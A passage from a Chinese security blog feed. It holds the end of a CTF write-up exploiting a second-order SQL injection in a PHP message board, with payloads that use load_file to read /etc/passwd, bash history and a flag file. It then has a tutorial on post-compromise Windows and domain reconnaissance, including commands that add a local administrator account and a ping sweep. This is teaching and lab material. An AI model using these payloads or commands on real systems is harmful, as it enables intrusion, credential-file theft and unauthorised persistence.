invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">                    set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                        title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                        content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>            <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>            <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$num</span> &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>                <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>                <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">                        set category = &#x27;<span class="hljs-subst">$categoty</span>&#x27;,</span><br><span class="hljs-string">                            content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                            bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>                <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>            &#125;<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里审计一下写评论的源码就知道，在我们写的时候进行了转义，但是在后面comment的时候直接把我们写进去的东西拿出来用了没有转义，很明显的二次注入</p><p>但是写评论需要登陆，密码是爆破出来的直接看wp了懒得爆了，密码为666</p><p>去抓了comment看了一下，是登陆之后写评论</p><p><img src="http://cdn.clown2024.cn/202407151704617.png" alt="image-20240525224542816"></p><p>发帖则是write，就是先开一个栏目的样子</p><p><img src="http://cdn.clown2024.cn/202407151704618.png" alt="image-20240525224624145"></p><p>通过上面的源码可以发现，只有categoty字段是存在二次注入的点的，我们可以先尝试一下</p><p>这里尝试一下插入查询database()</p><p>这里要注意一点我们的插入方式有点特殊</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#write界面传参<br>title=test&amp;category=test&#x27;,content=database(),/*&amp;content=test<br><br>#comment路由<br>content=*/#&amp;bo_id=7<br></code></pre></td></tr></table></figure><blockquote><p>这里要这么写的原因</p><p>我们这么写后他的sql语句就变成了这样：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">insert into comment set category = &#x27;test&#x27;,content=database(),/*&#x27;content=&#x27;*/#&#x27;,bo_id=&#x27;7&#x27;<br></code></pre></td></tr></table></figure><p>emmm但是有一个很神奇的问题，后面应该是被注释了是插入不了的，但是他却插入进去了。。。</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151704619.png" alt="image-20240525231101246"></p><p>然后就能在留言的地方看到数据库名字，然后我们就可以继续进行其他查表操作</p><p>然后去看一下&#x2F;etc&#x2F;passwd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#write界面传参<br>title=test&amp;category=test&#x27;,content=((select(load_file(&quot;/etc/passwd&quot;)))),/*&amp;content=test<br><br>#comment路由<br>content=*/#&amp;bo_id=7<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704620.png" alt="image-20240525233744085"></p><p>看到在web目录在home目录下</p><p>然后再去读一下历史操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#write界面传参<br>title=test&amp;category=test&#x27;,content=((select(load_file(&quot;/home/www/.bash_history&quot;)))),/*&amp;content=test<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704621.png" alt="image-20240525234012563"></p><p>可知tmp目录下还有DS_Store文件，我们去读一下</p><blockquote><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">title=test&amp;category=test&#x27;,content=((select(load_file(&quot;/tmp/html/.DS_Store&quot;)))),/*&amp;content=test<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704622.png" alt="image-20240525234301885"></p><p>但是乱码读不了先转成十六进制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">title=test&amp;category=test&#x27;,content=((select(hex(load_file(&quot;/tmp/html/.DS_Store&quot;))))),/*&amp;content=test<br><br><br>#结果<br>00000001427564310000100000000800000010000000040A000000000000000000000000000000000000000000000800000008000000000000000000000000000000000000000002000000000000000B000000010000100000730074007200610070496C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B000000090062006F006F007400730074007200610070496C6F63626C6F62000000100000004600000028FFFFFFFFFFFF00000000000B0063006F006D006D0065006E0074002E007000680070496C6F63626C6F6200000010000000CC0000002800000001FFFF000000000003006300730073496C6F63626C6F62000000100000015200000028FFFFFFFFFFFF0000000000190066006C00610067005F0038003900340036006500310066006600310065006500330065003400300066002E007000680070496C6F63626C6F6200000010000001D800000028FFFFFFFFFFFF0000000000050066006F006E00740073496C6F63626C6F62000000100000004600000098FFFFFFFFFFFF0000000000090069006E006400650078002E007000680070496C6F63626C6F6200000010000000CC0000009800000002FFFF000000000002006A0073496C6F63626C6F62000000100000015200000098FFFFFFFFFFFF000000000009006C006F00670069006E002E007000680070496C6F63626C6F6200000010000001D800000098FFFFFFFFFFFF000000000009006D007900730071006C002E007000680070496C6F63626C6F62000000100000004600000108FFFFFFFFFFFF00000000000600760065006E0064006F0072496C6F63626C6F6200000010000000CC00000108FFFFFFFFFFFF00000000000C00770072006900740065005F0064006F002E007000680070496C6F63626C6F62000000100000015200000108FFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000080B000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000002000000001000000400000000100000080000000010000010000000001000002000000000100000400000000000000000100001000000000010000200000000001000040000000000100008000000000010001000000000001000200000000000100040000000000010008000000000001001000000000000100200000000000010040000000000001008000000000000101000000000000010200000000000001040000000000000108000000000000011000000000000001200000000000000140000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000100B000000450000040A000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000104445344420000000100000000000000000000000000000000000000000000000200000020000000600000000000000001000000800000000100000100000000010000020000000000000000020000080000001800000000000000000100002000000000010000400000000001000080000000000100010000000000010002000000000001000400000000000100080000000000010010000000000001002000000000000100400000000000010080000000000001010000000000000102000000000000010400000000000001080000000000000110000000000000012000000000000001400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<br><br></code></pre></td></tr></table></figure><p>然后再hex解码一下拿到一个flag_8946e1ff1ee3e40f.php，去读一下这个文件拿到flag</p><p><img src="http://cdn.clown2024.cn/202407151704623.png" alt="image-20240525234731502"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">title=test&amp;category=test&#x27;,content=((select(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)))),/*&amp;content=test<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透体系建设-信息搜集</title>
      <link href="/2024/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2024/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1><span id="信息搜集">信息搜集</span></h1><p>当渗透测试人员通过 Web 渗透或其他方式获得服务器主机的权限后，需要以该主机为跳板，对其内网环境进行渗透。对于攻陷的第一台主机，其在内网中所处的网络位置当前登录的用户、该用户有什么样的权限、其操作系统信息、网络配置信息及当前运行的进程信息等都是未知的，这就需要测试人员以当前主机为中心进行信息收集。</p><h1><span id="本机基础信息搜集">本机基础信息搜集</span></h1><p><strong>查看当前用户、权限</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">whoami /all<br></code></pre></td></tr></table></figure><p>查看当前用户以及当前用户所处的用户组、所拥有的特权等信息，测试<br>人员可以对当前用户所拥有的特权有一个大致的了解，并综合判断是否需要提升权限。</p><p><img src="http://cdn.clown2024.cn/202407151745068.png" alt="image-20240318094322829"></p><p><img src="http://cdn.clown2024.cn/202407151745069.png" alt="image-20240318094352206"></p><p><strong>查看网络配置信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ipconfig /all<br></code></pre></td></tr></table></figure><p>查看当前主机的网络配置情况，包括主机的IP 地址、主机名、各网络适配器的信息可以从中判断出当前主机所处的内网网段</p><p><img src="http://cdn.clown2024.cn/202407151745070.png" alt="image-20240318094527225"></p><p><strong>查看主机路由信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">route print<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745071.png" alt="image-20240318094752859"></p><p>在路由表中的“网络目标”都是主机可以直接访问到的，测试人员在后续的横向渗透中可以尝试探测相关地址段的存活主机。</p><p><strong>查看操作系统信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">systeminfo<br>systeminfo | findstr /B /C:&quot;0S Name&quot; /C:&quot;0S Version&quot; # 查看操作系统及版本<br>systeminfo | findstr /B /C:&quot;0S 名称&quot; /C:&quot;0S 版本&quot; #查看操作系统及版本<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745072.png" alt="image-20240318095114506"></p><p><strong>查看端口连接信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">netstat -ano<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745073.png" alt="image-20240318133421621"></p><p>这里可以看到有哪些外部主机与本机建立连接，从这里可以收集内网地址段的信息，如果有内网主机连接就会显示地址信息，我这里连个百度网站来看看外部地址的变化</p><p><img src="http://cdn.clown2024.cn/202407151745074.png" alt="image-20240318133826701"></p><p><strong>查看当前会话列表</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net session<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745075.png" alt="image-20240318134119130"></p><p>查看当前主机与所连接的客户端主机之间的会话，我这里还没有建立连接</p><p><strong>查看当前网络共享信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net use<br></code></pre></td></tr></table></figure><p>查看当前主机与其他主机远程建立的网络共享连接</p><p><img src="http://cdn.clown2024.cn/202407151745076.png" alt="image-20240318134359209"></p><p><strong>查看当前进程信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">tasklist<br>tasklist /SVC<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745077.png" alt="image-20240318134424067"></p><p><img src="http://cdn.clown2024.cn/202407151745078.png" alt="image-20240318134445449"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic process get Name,ProcessId,ExecutablePath<br></code></pre></td></tr></table></figure><p>该命令可以i查询主机进程信息，并过滤出进程的路径、名称和PID<img src="http://cdn.clown2024.cn/202407151745079.png" alt="image-20240318134935916"></p><p>WMIC 是微软为 Windows管理规范(Windows Management Instrumentation，WMI)提供的一个命令行工具，提供从命令行接口和批处理脚本执行系统管理的支持。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic process where Name=&quot;conhost.exe&quot; get ExecutablePath<br></code></pre></td></tr></table></figure><p>该命令可以查看指定进程的路径信息</p><p><img src="http://cdn.clown2024.cn/202407151745080.png" alt="image-20240318135201960"></p><p><strong>查看当前服务信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic service get Caption, Name,PathName, StartName, State<br></code></pre></td></tr></table></figure><p>该命令查看当前所有服务的信息，并过滤出服务的名称、路径、创建时间、运行状态信息。</p><p><img src="http://cdn.clown2024.cn/202407151745081.png" alt="image-20240318181750072"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic service where Name=&quot;themes&quot; get Caption,PathName,State<br></code></pre></td></tr></table></figure><p>查看指定服务的信息，并过滤出服务名称、路径和运行状态</p><p><img src="http://cdn.clown2024.cn/202407151745082.png" alt="image-20240318182232588"></p><p><strong>查看计划任务信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /query /v /fo list<br></code></pre></td></tr></table></figure><p>该命令查看当前主机上所有的计划任务</p><p><img src="http://cdn.clown2024.cn/202407151745083.png" alt="image-20240318182513357"></p><p><strong>查看自启程序信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic startup get Caption,Command，Location，User<br></code></pre></td></tr></table></figure><p>该命令查看当前主机上所有的自启程序信息，并过滤出程序名称、所执行的命令、程序的路径所属用户</p><p><img src="http://cdn.clown2024.cn/202407151745084.png" alt="image-20240318182709052"></p><p><strong>查看系统补丁安装信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic qfe get Caption,Description,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure><p>查看当前主机安装的补丁列表，并过滤出补丁链接、名称、描述、补丁编号以及安装时间；通常，测试人员可以根据目标主机的操作系统版本和缺少的补丁来辅助后面的提权操作。</p><p><img src="http://cdn.clown2024.cn/202407151745085.png" alt="image-20240318214819594"></p><p><strong>查看应用安装信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic product get Caption,Version<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745086.png" alt="image-20240318214855646"></p><p><strong>查看本地用户&#x2F;组信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user<br>net user &lt;username&gt; #查看指定用户详细信息<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745087.png" alt="image-20240318215359151"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net localgroup administrators #查看本地管理员组<br></code></pre></td></tr></table></figure><p>可以看到，本地管理员组中除了本地管理员 Administrator，还包含域全局组clown，其在该主机加入域时自动被添加到计算机本地Administrators 组中，所以Domain Admins 组拥有该计算机的管理权限，那么我们就可以创建一个新的本地用户加入到本地管理员组</p><p><img src="http://cdn.clown2024.cn/202407151745088.png" alt="image-20240318215328201"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user &lt;username&gt; &lt;password&gt; /add  #创建本地用户<br>net localgroup administrators &lt;username&gt; /add  #将用户加入本地管理员组<br></code></pre></td></tr></table></figure><p><strong>查看当前登陆用户</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">query user<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745089.png" alt="image-20240318215825045"></p><h1><span id="域内信息搜集">域内信息搜集</span></h1><p><strong>判断是否存在域环境</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net config workstation<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745090.png" alt="image-20240324193823102"></p><p>查看当前工作站的信息，包括当前计算机名、用户名、系统版本、工作站、登录的域等</p><p><strong>查看域用户信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user /domain  #查看所有的域用户<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745091.png" alt="image-20240324194158121"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user &lt;username&gt; /domain #查看指定域用户信息<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745092.png" alt="image-20240324194257681"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic useraccount get Caption,Domain,Description #获取所有用户的SID、所属域和用户描述信息<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745093.png" alt="image-20240324195119836"></p><blockquote><p>注意，只有域用户才有权限执行域内查询操作。而计算机本地用户除非提升为本地系统权限，否则只能查询本机信息，无法查询域内信息并提示“拒绝访问”。这是因为，在域环境中，所有与域有关的查询都需要通过域控制器来实现，并且需要经过Kerberos协议进行认证。</p></blockquote><p><strong>查看域用户组信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group /domain #列出域内的所有用户组<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745094.png" alt="image-20240324195844774"></p><p>还可以通过上面的信息来指定用户组来查询详细信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group &quot;Domain Admins&quot; /domain #比如这个查询域管理员组的用户<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745095.png" alt="image-20240324200516235"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group &quot;Domain Computers&quot; /domain #可以得到域内所有的客户端主机<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745096.png" alt="image-20240324200614099"></p><p>下面是一些常见组</p><table><thead><tr><th>域组名称</th><th>说明</th></tr></thead><tbody><tr><td>Domain Admins</td><td>域管理员组，包括所有的域管理员用户</td></tr><tr><td>Domain Computers</td><td>域成员主机组，包括加入域的所有工作站和服务器</td></tr><tr><td>Domain Controllers</td><td>域控制器组，包括域中的所有域控制器</td></tr><tr><td>Domain Guests</td><td>域来宾组，包括域中所有的来宾用户</td></tr><tr><td>Domain Users</td><td>域用户组，包括所有域用户</td></tr><tr><td>Enterprise Admins</td><td>企业系统管理员组，适用于域林范围</td></tr></tbody></table><blockquote><p>在默认情况下，Domain Admins 组和Enterprise Admins 组中的用户对域内所有域控制器和域成员主机拥有完全控制权限。Enterprise Admins 组是一个通用组，是域林的根域中的一个组，并且其中的成员对域林中的所有域拥有完全控制权限而 Domain Admins 组是一个全局组，只对本域拥有完全控制权限。</p></blockquote><p><strong>查看域内密码策略</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net accounts /domain #查询域内用户的密码策略<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745097.png" alt="image-20240324201409096"></p><p><strong>查看域控制器列表</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group &quot;Domain Controllers&quot; /domain<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745098.png" alt="image-20240324202036188"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nltest /DCLIST:hacke.testlab  #用于查询指定域内的域控主机列表<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745099.png" alt="image-20240324202555802"></p><p><strong>查看主域控制器</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net time /domain<br></code></pre></td></tr></table></figure><p>在域环境中，主域控制器会同时被用作时间服务器，使得域中所有计算机的时钟同步。执行以下命令，通过查询时间服务器来找到主域控制器的名称。</p><p><img src="http://cdn.clown2024.cn/202407151745100.png" alt="image-20240324202703091"></p><p><strong>定位域控制器</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ping DC.hacke.testlab<br></code></pre></td></tr></table></figure><p>通过上面知道目标主机的主机名后，可以直接对主机名执行ping命令，根据执行返回的内容即可得知目标主机在内网中的IP地址。</p><p><img src="http://cdn.clown2024.cn/202407151745101.png" alt="image-20240324202858493"></p><p>除此之外，域控制器往往会被用作DNS服务器，所以找到当前主机的DNS服务器地址也可以定位域控。</p><p><strong>查看信任关系</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nltest /domain_trusts<br></code></pre></td></tr></table></figure><p>域信任用于多域环境中的跨域资源的共享。一般情况下，一个域的用户只能访问本域内的资源，无法访问其他域的资源，而要想不同域之间实现互访就需要建立域信任。</p><p><img src="http://cdn.clown2024.cn/202407151745103.png" alt="image-20240324203208639"></p><h1><span id="内网资源探测">内网资源探测</span></h1><p>在内网渗透中，测试人员往往需要通过各种内网扫描技术来探测内网资源的情况，为后续的横向渗透做准备，通常需要发现内网存活的主机，并探测主机的操作系统、主机开放了哪些端口、端口上运行了哪些服务、服务的当前版本是否存在已知漏洞等信息。这些信息可以帮助测试人员发现内网的薄弱资源，确定后续的攻击方向。</p><h2><span id="发现内网存活主机">发现内网存活主机</span></h2><p>渗透测试中可以根据主机情况，上传工具进行主机存货探测，也可以借助内网代理或者路由转发对目标主机所处的局域网进行探测。</p><p><strong>基于ICMP发现存活主机</strong></p><p>ping命令就是利用ICMP数据报来确认主机是否存活，下面命令可以循环探测整个局域网C段中存活的主机</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.30.%I | findstr &quot;TTL=&quot;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745104.png" alt="image-20240324204850543"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">for /L %I in (1,1,254)：这是一个 for 循环语句，用于迭代从 1 到 254 的数字。%I 是一个临时变量，它将在每次迭代中保存当前的数字。<br><br>@ping -w 1 -n 1 192.168.30.%I：在每次迭代中，该命令通过 ping 命令向局域网中的一个主机发送一个 